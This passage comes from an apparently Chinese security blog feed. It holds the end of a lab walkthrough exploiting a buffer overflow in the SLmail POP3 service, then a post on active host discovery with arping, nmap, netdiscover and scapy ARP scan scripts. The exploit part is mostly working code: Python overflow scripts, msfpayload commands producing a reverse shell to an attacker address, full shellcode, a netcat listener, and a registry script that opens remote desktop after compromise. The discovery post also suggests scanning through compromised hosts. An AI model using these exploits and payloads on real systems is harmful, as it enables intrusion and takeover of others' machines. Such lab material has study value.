<li><p>很遗憾，这个模块里面没有，换其他模块，然后就可以找到可利用的：<figure class="highlight plain"><figcaption><span>-s "\xff\xe4" -m slmfc.dll```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/37554586.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们双击第一个模块，然后以汇编指令显示就会发现FFES: jmp esp</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/52427619.jpg)</span><br><span class="line"></span><br><span class="line">- 在jmp esp指令这里设置断点：（主要是为了利用脚本向跳转的这里发送溢出的代码，验证是否正常可以跳转）</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/8694262.jpg)</span><br><span class="line"></span><br><span class="line">- 然后我们修改前面精确溢出的代码，溢出的四个字节改为这里设置断点的内存地址，也就是jmp esp ，在添加390个C，也就是说：当程序执行到这jmp esp的时候，跳到ESP寄存器，然后将390个C存入ESP中</span><br><span class="line"></span><br><span class="line">  - 首先我们可以看到jmp esp的地址为：5F 4A 35 8F</span><br><span class="line"></span><br><span class="line">    ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/38278009.jpg)</span><br><span class="line"></span><br><span class="line">  - 然后我们在脚本里构造溢出的内容为这个地址，由于计算机读取数据和人读是相反的，所以要将地址反过来构造：</span><br><span class="line"></span><br><span class="line">    ```python</span><br><span class="line">    #!/usr/bin/python</span><br><span class="line">    import socket</span><br><span class="line"> </span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;C&apos; * 390</span><br><span class="line">    try:</span><br><span class="line">        print &quot;\nSending evil buffer...&quot;</span><br><span class="line">        s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">        data = s.recv(1024)</span><br><span class="line">        s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">        data = s.recv(1024)</span><br><span class="line">        s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">        print &quot;\nDone!&quot;</span><br><span class="line">    except:</span><br><span class="line">        print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure></p>
<ul>
<li><p>然后发送数据，查看EIP和ESP的内容：（发现确实跳转了，EIP的内容为跳转的地址，存储C也是在ESP中执行了，说明我们可以执行shellcode）</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/73683041.jpg" alt></p>
<p>按F7执行下一步，发现又跳转到EIP：</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21013466.jpg" alt></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>现在解决了ESP的地址跳转问题，我们就可以进一步构造shellcode执行，进行系统的控制：</p>
<ul>
<li><p>生成shellcode</p>
</li>
<li><p>scratch  （可以用这个去自己写）</p>
</li>
<li><p>用msfpayload生成shellcode</p>
<ul>
<li><figure class="highlight plain"><figcaption><span>-l``` 查看所有的payload</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 C```  用反向连接的这个载荷，C表示的是C语言格式，但是生成以后我们发现存在坏字符，所以shellcode不能使用</span><br><span class="line"></span><br><span class="line">  - ```sudo ./msfpayload win32_reverse LHOST=192.168.111.140 LPORT=4444 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;```   这里使用msfemcode对三个字符进行转义，R是保证msfemcode可以使用、</span><br><span class="line"></span><br><span class="line">    ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/15011544.jpg)</span><br><span class="line"></span><br><span class="line">- 将shellcode加入代码中：</span><br><span class="line"></span><br><span class="line">  ```python</span><br><span class="line">  #!/usr/bin/python</span><br><span class="line">  import socket</span><br><span class="line"> </span><br><span class="line">  s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">  shellcode = (</span><br><span class="line">  &quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf7\x71\x2c&quot; +</span><br><span class="line">  &quot;\xc1\x83\xeb\xfc\xe2\xf4\x0b\x1b\xc7\x8c\x1f\x88\xd3\x3e\x08\x11&quot; +</span><br><span class="line">  &quot;\xa7\xad\xd3\x55\xa7\x84\xcb\xfa\x50\xc4\x8f\x70\xc3\x4a\xb8\x69&quot; +</span><br><span class="line">  &quot;\xa7\x9e\xd7\x70\xc7\x88\x7c\x45\xa7\xc0\x19\x40\xec\x58\x5b\xf5&quot; +</span><br><span class="line">  &quot;\xec\xb5\xf0\xb0\xe6\xcc\xf6\xb3\xc7\x35\xcc\x25\x08\xe9\x82\x94&quot; +</span><br><span class="line">  &quot;\xa7\x9e\xd3\x70\xc7\xa7\x7c\x7d\x67\x4a\xa8\x6d\x2d\x2a\xf4\x5d&quot; +</span><br><span class="line">  &quot;\xa7\x48\x9b\x55\x30\xa0\x34\x40\xf7\xa5\x7c\x32\x1c\x4a\xb7\x7d&quot; +</span><br><span class="line">  &quot;\xa7\xb1\xeb\xdc\xa7\x81\xff\x2f\x44\x4f\xb9\x7f\xc0\x91\x08\xa7&quot; +</span><br><span class="line">  &quot;\x4a\x92\x91\x19\x1f\xf3\x9f\x06\x5f\xf3\xa8\x25\xd3\x11\x9f\xba&quot; +</span><br><span class="line">  &quot;\xc1\x3d\xcc\x21\xd3\x17\xa8\xf8\xc9\xa7\x76\x9c\x24\xc3\xa2\x1b&quot; +</span><br><span class="line">  &quot;\x2e\x3e\x27\x19\xf5\xc8\x02\xdc\x7b\x3e\x21\x22\x7f\x92\xa4\x32&quot; +</span><br><span class="line">  &quot;\x7f\x82\xa4\x8e\xfc\xa9\x37\xd9\x43\x4d\x91\x19\x3d\x9d\x91\x22&quot; +</span><br><span class="line">  &quot;\xa5\x20\x62\x19\xc0\x38\x5d\x11\x7b\x3e\x21\x1b\x3c\x90\xa2\x8e&quot; +</span><br><span class="line">  &quot;\xfc\xa7\x9d\x15\x4a\xa9\x94\x1c\x46\x91\xae\x58\xe0\x48\x10\x1b&quot; +</span><br><span class="line">  &quot;\x68\x48\x15\x40\xec\x32\x5d\xe4\xa5\x3c\x09\x33\x01\x3f\xb5\x5d&quot; +</span><br><span class="line">  &quot;\xa1\xbb\xcf\xda\x87\x6a\x9f\x03\xd2\x72\xe1\x8e\x59\xe9\x08\xa7&quot; +</span><br><span class="line">  &quot;\x77\x96\xa5\x20\x7d\x90\x9d\x70\x7d\x90\xa2\x20\xd3\x11\x9f\xdc&quot; +</span><br><span class="line">  &quot;\xf5\xc4\x39\x22\xd3\x17\x9d\x8e\xd3\xf6\x08\xa1\x44\x26\x8e\xb7&quot; +</span><br><span class="line">  &quot;\x55\x3e\x82\x75\xd3\x17\x08\x06\xd0\x3e\x27\x19\xdc\x4b\xf3\x2e&quot; +</span><br><span class="line">  &quot;\x7f\x3e\x21\x8e\xfc\xc1&quot;)</span><br><span class="line">  buffer = &apos;A&apos; * 2606 + &apos;\x8f\x35\x4a\x5f&apos; + &apos;\x90&apos; * 8 +shellcode</span><br><span class="line">  try:                </span><br><span class="line">      #\x90表示的是汇编中的nop，就是不执行操作，保证shellcode的可用性，为了防止esp执行的时候把我的shellcode的前面几个字符忽略掉</span><br><span class="line">      print &quot;\nSending evil buffer...&quot;</span><br><span class="line">      s.connect((&apos;192.168.111.137&apos;,110))</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;USER test&apos; + &apos;\r\n&apos;)</span><br><span class="line">      data = s.recv(1024)</span><br><span class="line">      s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">      print &quot;\nDone!&quot;</span><br><span class="line">  except:</span><br><span class="line">      print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li><p>现在我们监听本地的4444端口，等待反向连接</p>
<figure class="highlight plain"><figcaption><span>nc -vlp 4444```</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 然后保证SLmail服务正常运行，发送数据，然后缓冲区溢出利用成功，拿到系统权限：</span><br><span class="line"></span><br><span class="line">  ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/34848509.jpg)</span><br><span class="line"></span><br><span class="line">  - 执行系统命令：</span><br><span class="line"></span><br><span class="line">    ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-22/21092299.jpg)</span><br><span class="line"></span><br><span class="line">  - 觉得命令行不舒服：改注册表，然后3389远程连接：</span><br><span class="line"></span><br><span class="line">    - ```tex</span><br><span class="line">      echo Windows Registry Editor Version 5.00&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      C:\&gt;echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line">      echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line">      regedit /s 3389.reg</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>rdesktop 192.168.111.137</code>  远程桌面连接。</p>
<p><img src="http://demos-qq.oss-cn-beijing.aliyuncs.com/18-3-23/7906793.jpg" alt></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>fuzzy</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>fuzzy</tag>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>主动信息收集</title>
    <url>/2018/06/05/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0/</url>
    <content><![CDATA[<blockquote>
<p>被动收集的信息可能不是最新的信息，通过主动的手段去发现更精确的信息</p>
</blockquote>
<ul>
<li>直接与目标系统交互通信</li>
<li>无法避免留下访问的痕迹（如果目标系统有完善的系统日志）</li>
<li>使用受控的第三方电脑进行探测<ul>
<li>使用代理或已经被控制的主机</li>
<li>做好本封杀的准备</li>
<li>使用噪声迷惑目标，淹没真实的探测流量</li>
</ul>
</li>
<li>扫描<ul>
<li>发送不同的探测，根据返回结果判断目标状态（ip，端口，服务）</li>
</ul>
</li>
</ul>
<h3 id="发现"><a href="#发现" class="headerlink" title="发现"></a>发现</h3><ul>
<li>识别活着的主机<ul>
<li>潜在的被攻击目标</li>
</ul>
</li>
<li>输出一个ip地址列表</li>
<li>2，3，4层发现</li>
</ul>
<h4 id="发现——二层发现"><a href="#发现——二层发现" class="headerlink" title="发现——二层发现"></a>发现——二层发现</h4><ul>
<li>优点：扫描速度快，可靠</li>
<li>缺点：不可路由，只能发现本网段</li>
<li>ARP协议<ul>
<li>抓包</li>
</ul>
</li>
</ul>
<ol>
<li><p>arping:(二层中单个存活主机的探测)</p>
<ul>
<li><figure class="highlight plain"><figcaption><span>arping 192.168.0.1 -c 1```  -c是指定发送一个包以后看是否存在，否则会一直发包；如果不在一个网络里，发包的话是不存在的</span></figcaption><table><tr><td class="code"><pre><span class="line">   - ```sudo arping 192.168.0.1 -d``` -d是同一个ip拥有不同的Mac地址，就是说，如果结果显示有两个Mac地址声称自己是网关，那么你的网络就存在arp欺骗，然后根据路由器查arp表进行定位</span><br><span class="line">   - ```sudo arping 192.168.0.1 -c 1 | grep &quot;bytes from&quot; | cut -d&quot; &quot; -f 5 |cut -d &quot;(&quot; -f 2 | cut -d&quot;)&quot; -f 1``` 通过管道显示活着的主机</span><br><span class="line">   - 但是这样只能扫描一个ip，不能自动化的去扫描一个网段，所以用脚本去实现：扫描的时候可以指定网卡，这里用bash脚本来实现这个功能```sudo ./arping1.sh eth0 &gt; addr.txt``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/12275742.jpg)</span><br><span class="line">   - 第二个脚本：这个脚本的功能是去探测已知ip列表的主机是否存活的脚本，前提是要有一个ip列表的文件```sudo ./arping2.sh addr.txt``` ![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/77751631.jpg)</span><br><span class="line">   - 如果要在扫描的时候直接将结果重定向到一个文本文件中，直接早bash脚本中添加即可</span><br><span class="line"></span><br><span class="line">2. 二层发现——nmap:</span><br><span class="line"></span><br><span class="line">   - ```nmap -sn 192.168.0.1/24```   扫描速度更快，显示的信息更多</span><br><span class="line"></span><br><span class="line">   - &gt; Nmap scan report for 192.168.0.1</span><br><span class="line">     &gt; Host is up (0.020s latency).</span><br><span class="line">     &gt; Nmap scan report for 192.168.0.101</span><br><span class="line">     &gt; Host is up (0.0011s latency).</span><br><span class="line">     &gt; Nmap scan report for 192.168.0.104</span><br><span class="line">     &gt; Host is up (0.084s latency).</span><br><span class="line">     &gt; Nmap scan report for 192.168.0.107</span><br><span class="line">     &gt; Host is up (0.00059s latency).</span><br><span class="line">     &gt; Nmap done: 256 IP addresses (4 hosts up) scanned in 5.65 seconds</span><br><span class="line"></span><br><span class="line">   - ```nmap -iL filename -sn``` 这个可以做和arping第二个脚本一样的工作</span><br><span class="line"></span><br><span class="line">     &gt; -sn 参数不做端口扫描，但它不仅仅发ARP记录，还会DNS做ptr反向域名解析的解析</span><br><span class="line"></span><br><span class="line">3. 二层发现———Netdiscover</span><br><span class="line"></span><br><span class="line">   - 专用与二层发现</span><br><span class="line">   - 可用于无线和交换网络环境</span><br><span class="line">   - 主动和被动扫描</span><br><span class="line">   - 主动</span><br><span class="line">     - netdiscover -i eth0 -r 192.168.0.1/24![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/71668956.jpg)</span><br><span class="line">     - netdiscover -l iplist.txt</span><br><span class="line">   - 被动</span><br><span class="line">     - netdiscover -p （开启混杂模式）只要在在网卡上有arp包数据，就可以侦听到：![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/18073354.jpg)</span><br><span class="line">     - 主动arp容易触发预警</span><br><span class="line"></span><br><span class="line">4. 二层发现———Scapy</span><br><span class="line"></span><br><span class="line">   - scapy</span><br><span class="line"></span><br><span class="line">     - 作为Python的库文件进行调用</span><br><span class="line">     - 也可以做单独的工具使用</span><br><span class="line">     - 抓包，分析，创建，修改，注入网络流量</span><br><span class="line"></span><br><span class="line">   - apt-get install python-gnuplot</span><br><span class="line"></span><br><span class="line">   - 输入scapy启动scapy启动，然后输入ARP()调用这个函数，```ARP().display()查询ARP函数的属性``` ，这样就可以定制（arp的报头结构，将函数的属性字段添加进去，这样就可以实现一个arp查询）![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/83165222.jpg)</span><br><span class="line"></span><br><span class="line">   - 直接利用scapy进行arp探测，实际上就是通过调用scapy自带的函数进行查询：</span><br><span class="line"></span><br><span class="line">     - 首先```sudo scapy``` 启动进行scapy命令行模式下</span><br><span class="line">     - 通过```ARP().display()``` 可以查看APR这个函数下的函数头，然后这只pdst这个要查询的目标```arp.pdst=&quot;192.168.0.1&quot;``` 这里的arp是设置的变量</span><br><span class="line">     - 通过```sr1(arp)``` 进行发包然后查看回显：这里也可以设置一个anwser变量带代替返回的数据包，然后调用display方法查看数据包的返回情况（有一个问题，如果查询的是一个不存在的ip，这样会一直发包，所以要加上timeout，加上一个verbose=1，显示详细的信息）![](http://demos-qq.oss-cn-beijing.aliyuncs.com/18-2-9/81052649.jpg)</span><br><span class="line">     - scapy是Python的库，所以也支持Python脚本来进行探测，可以调用这个库来写脚本进行arp扫描，前面用的是shell脚本```sudo ./arp_disc.py eth0```  用脚本的话要慢，首先这里设计的脚本不是多线程，其次还要判断超时的时间，当然为了准确性，scarp默认发两个数据包</span><br><span class="line"></span><br><span class="line">     &gt; ```python</span><br><span class="line">     &gt; #!/usr/bin/python</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; import logging</span><br><span class="line">     &gt; import subprocess</span><br><span class="line">     &gt; logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">     &gt; from scapy.all import *</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; if len(sys.argv) != 2:</span><br><span class="line">     &gt;     print &quot;Usage - ./arp_disc.py [interface]&quot;</span><br><span class="line">     &gt;     print &quot;Example - ./ar_disc.py eth0&quot;</span><br><span class="line">     &gt;     print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">     &gt;     sys.exit()</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; interface = str(sys.argv[1])</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; ip = subprocess.check_output(&quot;ifconfig&quot; + interface + &quot; | grep &apos;inet&apos; | cut -d&apos;.&apos; -f 1-3 | cut -d&quot; &quot; -f 10 | cut -d &apos;f&apos; -f 1 &quot;,shell = True).strip()</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; prefix = ip.split(&apos;.&apos;)[0] + &apos;.&apos; + ip.split(&apos;.&apos;)[1] + &apos;.&apos; +ip.split(&apos;.&apos;)[2] + &apos;.&apos;</span><br><span class="line">     &gt;</span><br><span class="line">     &gt; for addr in range(1,254):</span><br><span class="line">     &gt;     answer = sr1(ARP(pdst=prefix+str(addr)),timeout = 1,verbose = 0)</span><br><span class="line">     &gt;     if answer == None:</span><br><span class="line">     &gt;         pass</span><br><span class="line">     &gt;     else:</span><br><span class="line">     &gt;         print prefix + str(addr)</span><br><span class="line">     &gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>第二个脚本，这个脚本和arping的第二个脚本类似，都是可以调用已知的ip列表文件进行二层的发现：<figure class="highlight plain"><figcaption><span>./arp_disc.py ip_list.txt```  脚本代码如下：</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&gt; ```python</span><br><span class="line">&gt; #!/usr/bin/python</span><br><span class="line">&gt; #-*- coding:utf-8 -*-</span><br><span class="line">&gt; </span><br><span class="line">&gt; import logging</span><br><span class="line">&gt; import subprocess</span><br><span class="line">&gt; logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">&gt; from scapy.all import *</span><br><span class="line">&gt; </span><br><span class="line">&gt; if len(sys.argv) != 2:</span><br><span class="line">&gt; print &quot;Usage - ./arp_disc.py [filename]&quot;</span><br><span class="line">&gt; print &quot;Example - ./arp_disc.py ip_list.txt&quot;</span><br><span class="line">&gt; print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">&gt; sys.exit()</span><br><span class="line">&gt; </span><br><span class="line">&gt; filename = str(sys.argv[1])</span><br><span class="line">&gt; file = open(filename,&apos;r&apos;)    #打开文件列表</span><br><span class="line">&gt; </span><br><span class="line">&gt; for addr in file:</span><br><span class="line">&gt; answer = sr1(ARP(pdst=prefix+str(addr)),timeout = 0.1,verbose = 0) #verbose=0，不显示报错的具体信息</span><br><span class="line">&gt; if answer == None:</span><br><span class="line">&gt;     pass</span><br><span class="line">&gt; else:</span><br><span class="line">&gt;     print addr.strip()    #将报错信息打印出来</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p>
</blockquote>
</li>
</ul>
</li>
</ol>
<blockquote>
<p><strong>总结：二层的发现主要是在拿下一台主机以后以此机器作为跳板进而对整个内网进行发现，但是由于内网的网络环境未知，而且服务器上面不一定有nmap，所以我们要利用一切可以利用的工具：arping，nmap,netdiscover,scopy等工具，以及自己编写的脚本</strong></p>
</blockquote>
<p><em>针对上面的两个脚本再补充两个多线程的脚本，就当做py练手了</em></p>
<ol>
<li><blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt; <span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">&gt; <span class="keyword">import</span> logging</span><br><span class="line">&gt; <span class="keyword">import</span> subprocess</span><br><span class="line">&gt; <span class="keyword">import</span> threading,time</span><br><span class="line">&gt;</span><br><span class="line">&gt; logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line">&gt; <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [interface]"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py eth0"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span></span><br><span class="line">&gt;     sys.exit()</span><br><span class="line">&gt;</span><br><span class="line">&gt; interface = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">&gt;</span><br><span class="line">&gt; ip = subprocess.check_output(</span><br><span class="line">&gt;     <span class="string">"ifconfig "</span> + interface + <span class="string">" | grep 'inet' | cut -d'.' -f 1-3 | cut -d' ' -f 10 | cut -d 'f' -f 1 "</span>,</span><br><span class="line">&gt;     shell = <span class="keyword">True</span>).strip()</span><br><span class="line">&gt; prefix = ip.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         threading.Thread.__init__(self)</span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         <span class="keyword">global</span> answer,lock,n</span><br><span class="line">&gt;         time.sleep(<span class="number">0.1</span>)</span><br><span class="line">&gt;         <span class="keyword">if</span> lock.acquire():</span><br><span class="line">&gt;             answer = sr1(ARP(pdst = prefix + str(n)),timeout = <span class="number">1</span>,verbose = <span class="number">0</span>)</span><br><span class="line">&gt;             <span class="keyword">if</span> answer == <span class="keyword">None</span>:</span><br><span class="line">&gt;                 <span class="keyword">pass</span></span><br><span class="line">&gt;             <span class="keyword">else</span>:</span><br><span class="line">&gt;                 <span class="keyword">print</span> prefix + str(n)</span><br><span class="line">&gt;             n += <span class="number">1</span></span><br><span class="line">&gt;             lock.release()</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">&gt;     n = <span class="number">1</span></span><br><span class="line">&gt;     ThreadList = []</span><br><span class="line">&gt;     lock = threading.Lock()</span><br><span class="line">&gt;     <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">&gt;         t = MyThread()</span><br><span class="line">&gt;         ThreadList.append(t)</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.start()</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.join()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt; <span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">&gt; <span class="keyword">import</span> logging</span><br><span class="line">&gt; <span class="keyword">import</span> subprocess</span><br><span class="line">&gt; <span class="keyword">import</span> threading,time</span><br><span class="line">&gt;</span><br><span class="line">&gt; logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line">&gt; <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [interface]"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py eth0"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span></span><br><span class="line">&gt;     sys.exit()</span><br><span class="line">&gt;</span><br><span class="line">&gt; interface = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">&gt;</span><br><span class="line">&gt; ip = subprocess.check_output(</span><br><span class="line">&gt;     <span class="string">"ifconfig "</span> + interface + <span class="string">" | grep 'inet' | cut -d'.' -f 1-3 | cut -d' ' -f 10 | cut -d 'f' -f 1 "</span>,</span><br><span class="line">&gt;     shell = <span class="keyword">True</span>).strip()</span><br><span class="line">&gt; prefix = ip.split(<span class="string">'.'</span>)[<span class="number">0</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">1</span>] + <span class="string">'.'</span> + ip.split(<span class="string">'.'</span>)[<span class="number">2</span>] + <span class="string">'.'</span></span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         threading.Thread.__init__(self)</span><br><span class="line">&gt;</span><br><span class="line">&gt;     <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">&gt;         <span class="keyword">global</span> answer,lock</span><br><span class="line">&gt;         time.sleep(<span class="number">0.1</span>)</span><br><span class="line">&gt;         <span class="keyword">if</span> lock.acquire():</span><br><span class="line">&gt;             <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">254</span>):</span><br><span class="line">&gt;                 answer = sr1(ARP(pdst = prefix + str(addr)),timeout = <span class="number">1</span>,verbose = <span class="number">0</span>)</span><br><span class="line">&gt;                 <span class="keyword">if</span> answer == <span class="keyword">None</span>:</span><br><span class="line">&gt;                     <span class="keyword">pass</span></span><br><span class="line">&gt;                 <span class="keyword">else</span>:</span><br><span class="line">&gt;                     <span class="keyword">print</span> prefix + str(addr)</span><br><span class="line">&gt;             lock.release()</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">&gt;     ThreadList = []</span><br><span class="line">&gt;     lock = threading.Lock()</span><br><span class="line">&gt;     <span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">&gt;         t = MyThread()</span><br><span class="line">&gt;         ThreadList.append(t)</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.start()</span><br><span class="line">&gt;     <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">&gt;         t.join()</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ol>
<ol start="2">
<li><blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt; <span class="comment">#!/usr/bin/python</span></span><br><span class="line">&gt; <span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">import</span> logging</span><br><span class="line">&gt; <span class="keyword">import</span> subprocess</span><br><span class="line">&gt; <span class="keyword">import</span> threading,time</span><br><span class="line">&gt;</span><br><span class="line">&gt; logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line">&gt; <span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line">&gt;</span><br><span class="line">&gt; <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [filename]"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py ip_list.txt"</span></span><br><span class="line">&gt;     <span class="keyword">print</span> <span class="string">"Example will perform an ARP scan of the local subnet to which eth0 is assigned"</span></span><br><span class="line">&gt;     sys.exit()</span><br><span class="line">&gt;</span><br><span class="line">&gt; filename = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">&gt; file = open(filename,<span class="string">'r'</span>)  